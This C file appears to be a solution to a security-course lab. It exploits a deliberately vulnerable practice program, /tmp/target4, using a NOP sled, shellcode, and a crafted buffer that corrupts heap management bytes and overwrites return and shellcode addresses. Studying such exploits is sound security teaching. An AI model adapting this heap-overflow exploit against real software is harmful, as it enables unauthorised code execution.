#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define NOP 0x90
#define SIZE 1024
#define JMP "\xeb\x06"
#define SHELL_ADDR 0xbffffa3c
#define RET 0x08049c68

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[SIZE];
  memset(buf,NOP,SIZE -1);
  buf[SIZE - 1]=0;
  memcpy(buf,JMP,2); // jump over 8 management bytes 
  memcpy(buf+8,shellcode,strlen(shellcode));
  memcpy(buf+4,"\xfd",1); //set presence bit to be 0
  *(int *)(buf+504)=RET; 
  *(int *)(buf+508)=SHELL_ADDR;

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
